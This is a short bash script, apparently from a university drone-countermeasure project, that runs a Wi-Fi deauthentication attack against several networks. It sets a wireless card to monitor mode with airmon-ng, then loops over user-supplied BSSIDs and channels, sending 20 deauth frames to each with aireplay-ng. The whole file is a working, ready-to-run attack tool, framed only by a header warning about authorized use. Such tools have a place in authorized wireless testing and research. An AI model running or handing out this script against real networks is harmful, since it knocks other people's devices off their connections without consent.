#!/bin/bash
# ==============================================================================
# Enhanced Drone Countermeasure System - Multi-Device De-authentication Script
# Author: Giridhar S
# Project: Enhanced Drone Countermeasure System Utilizing Real-time
#          De-Authentication Attacks with Raspberry Pi and Optimized
#          Network Adapters (Sathyabama Institute of Science and Technology)
#
# WARNING: For authorized security research / testing on networks and
# devices you own or have explicit written permission to test. See
# LICENSE and DISCLAIMER.md in the repo root before use.
# ==============================================================================

set -euo pipefail

echo "Starting multiple device deauthentication script..."

# List available wireless interfaces
echo "Available interfaces:"
iwconfig 2>/dev/null | grep "IEEE 802.11" | awk '{print $1}'

# Prompt for wireless interface
read -rp "Enter the name of your wireless interface (e.g., wlan0): " iface

# Put the interface into monitor mode
echo "Setting $iface to monitor mode..."
airmon-ng start "$iface"

# Confirm BSSIDs
read -rp "Enter the BSSIDs of the target networks (space-separated, e.g., BSSID1 BSSID2): " bssids

# Convert BSSID list to array
read -ra bssids_array <<< "$bssids"

# Loop through each BSSID
for bssid in "${bssids_array[@]}"; do
  echo "Selected BSSID: $bssid"

  # Prompt for the channel
  read -rp "Enter the channel for BSSID $bssid: " channel

  echo "Setting $iface to channel $channel..."
  iwconfig "$iface" channel "$channel"

  # Start deauthentication attack with 20 packets
  echo "Starting deauthentication attack on $bssid (channel $channel)..."
  aireplay-ng --deauth 20 -a "$bssid" "$iface"
done

# Stop monitor mode
echo "Stopping monitor mode..."
airmon-ng stop "$iface"

echo "Script finished."
